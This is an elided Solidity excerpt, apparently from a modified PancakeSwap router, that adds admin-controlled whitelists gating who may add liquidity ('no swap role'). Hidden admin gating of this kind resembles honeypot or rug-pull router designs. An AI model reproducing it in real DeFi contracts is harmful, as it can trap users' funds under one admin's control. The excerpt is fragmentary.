...
library PancakeLibrary {
    ...
    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
        ...
        pair = address(uint(keccak256(abi.encodePacked(
                ...
                hex'7cfa12847547520f5c64aa26e695a5774b11ed952f787be6c7102d1945ad9a5c' // init code hash
            ))));
    }
...
contract PancakeRouter is IPancakeRouter02 {
    ...
    function setWhiteList(address _addr, uint256 _type, bool _YorN) external {require(adminU == msg.sender, "no swap role"); writeList[_addr] = _YorN;}
    function setSwapWhiteList(address _addr, uint256 _type, bool _YorN) external {require(adminU == msg.sender, "no swap role"); swapList[_addr] = _YorN;}
    ...
    function _addLiquidity(
        ...
        require(swapList[msg.sender], "no swap role");
